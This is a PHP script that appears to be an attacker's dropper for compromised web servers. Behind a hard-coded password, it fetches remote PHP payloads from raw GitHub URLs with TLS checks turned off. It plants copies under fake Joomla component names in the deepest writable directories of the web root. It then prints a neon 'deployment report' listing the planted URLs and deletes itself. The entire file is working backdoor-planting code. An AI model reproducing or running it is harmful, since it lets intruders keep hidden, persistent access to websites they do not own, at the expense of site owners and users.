<?php
/**
 * Cyber-Style Multi-Branch Deployer v2
 * Theme: Terminal Neon - Machine Edition
 * Features: Multi-Source, Random-Payload, Self-Destruct
 */

@ini_set('display_errors', 0);
@set_time_limit(0);

$password_target = "seomagang";

if (!isset($_POST['pass']) || $_POST['pass'] !== $password_target) {
    echo '
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: "Courier New", Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { border: 1px solid #00ff00; padding: 30px; box-shadow: 0 0 15px #00ff00; text-align: center; }
        input { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; margin-bottom: 10px; outline: none; text-align: center; }
        input[type="submit"] { cursor: pointer; transition: 0.3s; }
        input[type="submit"]:hover { background: #00ff00; color: #000; }
    </style>
    <div class="login-box">
        <h3>ENGINE SYSTEM ACCESS</h3>
        <form method="post">
            <input type="password" name="pass" placeholder="Enter Credentials"><br>
            <input type="submit" value="[ START COMBUSTION ]">
        </form>
    </div>';
    exit;
}

// Konfigurasi 3 Opsi Source (Ganti URL di bawah sesuai kebutuhan)
$sourceOptions = [
    "https://raw.githubusercontent.com/dumplink60-a11y/landing-page/refs/heads/main/web-assets.php",
    "https://raw.githubusercontent.com/dumplink60-a11y/landing-page/refs/heads/main/tuhan.php",
    "https://raw.githubusercontent.com/dumplink60-a11y/landing-page/refs/heads/main/403.php"
];

// Daftar 20 Nama Komponen Mesin
$fileList = [
    "joomla.php", "com_content.php", "mod_menu.php", "plg_system.php",
    "jversion.php", "factory.php",
    "juri.php", "jroute.php", "jinput.php", "jsession.php", "jdatabase.php",
];
function get_content($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return @file_get_contents($url);
}

function getDeepestOfBranch($branchPath) {
    $deepest = $branchPath;
    $maxDepth = 0;
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($branchPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST,
            RecursiveIteratorIterator::CATCH_GET_CHILD
        );
        foreach ($it as $file) {
            if ($file->isDir() && is_writable($file->getRealPath())) {
                $p = $file->getRealPath();
                $d = substr_count($p, DIRECTORY_SEPARATOR);
                if ($d > $maxDepth) {
                    $maxDepth = $d;
                    $deepest = $p;
                }
            }
        }
    } catch (Exception $e) {}
    return $deepest;
}

$root = $_SERVER['DOCUMENT_ROOT'];
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
$domain = $protocol . $_SERVER['HTTP_HOST'];

$mainBranches = [];
foreach (scandir($root) as $item) {
    $fullPath = $root . DIRECTORY_SEPARATOR . $item;
    if ($item != '.' && $item != '..' && is_dir($fullPath) && is_writable($fullPath)) {
        $mainBranches[] = $fullPath;
    }
}
if (empty($mainBranches)) $mainBranches = [$root];

echo '
<!DOCTYPE html>
<html>
<head>
    <title>Machine Deployment Report</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: "Courier New", monospace; padding: 20px; font-size: 13px; }
        .cyber-table { width: 100%; border-collapse: collapse; border: 1px solid #00ff00; margin-top: 20px; }
        .cyber-table th { background: #003300; color: #00ff00; padding: 12px; border-bottom: 2px solid #00ff00; text-align: left; }
        .cyber-table td { border: 1px solid #004400; padding: 8px; }
        .copy-btn { background: transparent; border: 1px solid #00ff00; color: #00ff00; padding: 2px 8px; cursor: pointer; font-size: 10px; }
        .copy-btn:hover { background: #00ff00; color: #000; }
        .header-info { color: #00ff00; text-shadow: 0 0 5px #00ff00; }
    </style>
</head>
<body>
    <div class="header-info">
        [+] MACHINE CORE INITIALIZED...<br>
        [+] TARGET_DOMAIN: '.$domain.'<br>
        [+] DEPLOYING 20 COMPONENTS WITH RANDOM SEQUENCING...
    </div>
    <table class="cyber-table">
        <thead>
            <tr>
                <th>ID</th>
                <th>COMPONENT</th>
                <th>SOURCE_USED</th>
                <th>TARGET_URL</th>
                <th>ACTION</th>
            </tr>
        </thead>
        <tbody>';

$count = 1;
foreach ($fileList as $index => $fileName) {
    // Pilih source secara acak dari 3 opsi
    $randomSourceKey = array_rand($sourceOptions);
    $selectedSource = $sourceOptions[$randomSourceKey];
    
    $raw = get_content($selectedSource);
    
    if($raw) {
        $branchIndex = $index % count($mainBranches);
        $selectedBranch = $mainBranches[$branchIndex];
        $targetDir = getDeepestOfBranch($selectedBranch);
        $finalPath = $targetDir . DIRECTORY_SEPARATOR . $fileName;

        if (@file_put_contents($finalPath, $raw)) {
            $webPath = str_replace(realpath($root), '', realpath($targetDir));
            $webPath = str_replace('\\', '/', $webPath);
            $finalUrl = $domain . $webPath . '/' . $fileName;

            echo '
            <tr>
                <td>'.str_pad($count, 2, "0", STR_PAD_LEFT).'</td>
                <td>'.$fileName.'</td>
                <td><small>Source #'.($randomSourceKey + 1).'</small></td>
                <td><span id="link-'.$count.'">'.$finalUrl.'</span></td>
                <td><button class="copy-btn" onclick="copyToClipboard(\'link-'.$count.'\')">Copy</button></td>
            </tr>';
            $count++;
        }
    }
}

echo '
        </tbody>
    </table>

    <script>
        function copyToClipboard(id) {
            var text = document.getElementById(id).innerText;
            var elem = document.createElement("textarea");
            document.body.appendChild(elem);
            elem.value = text;
            elem.select();
            document.execCommand("copy");
            document.body.removeChild(elem);
            alert("LINK COPIED");
        }
    </script>
</body>
</html>';

// Self Destruct
@unlink(__FILE__);
?>